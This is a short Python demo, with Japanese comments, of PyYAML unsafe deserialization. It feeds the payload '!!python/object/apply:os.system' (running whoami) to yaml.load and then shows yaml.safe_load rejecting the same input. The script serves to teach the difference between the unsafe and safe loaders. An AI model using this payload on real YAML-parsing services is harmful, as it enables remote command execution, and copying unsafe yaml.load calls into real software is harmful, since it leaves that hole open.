import yaml
import os

# 脆弱なPyYAMLでデシリアライズすると、os.system('whoami') を実行するペイロード
malicious_yaml = "!!python/object/apply:os.system ['whoami']"

print(f"使用中のPyYAMLバージョン: {yaml.__version__}")
print("--- 脆弱な関数 yaml.load() の実行 ---")

try:
    # この関数は信頼できないデータを扱うと非常に危険です
    # PyYAML 5.3.1 では Loader の指定なしで動作します
    # 最新版で脆弱性を再現するには yaml.load(malicious_yaml, Loader=yaml.UnsafeLoader) のように指定します
    result = yaml.load(malicious_yaml) 
    print("コマンドが実行されました。")
    
except Exception as e:
    print(f"エラー: {e}")

print("\n--- 安全な関数 yaml.safe_load() の実行 ---")

try:
    # safe_loadは、このような危険な処理を許可しないため安全です
    safe_result = yaml.safe_load(malicious_yaml)
    print(f"安全に処理されました。結果: {safe_result}")
    
except yaml.YAMLError as e:
    print(f"悪意のあるYAMLがブロックされました: {e}")
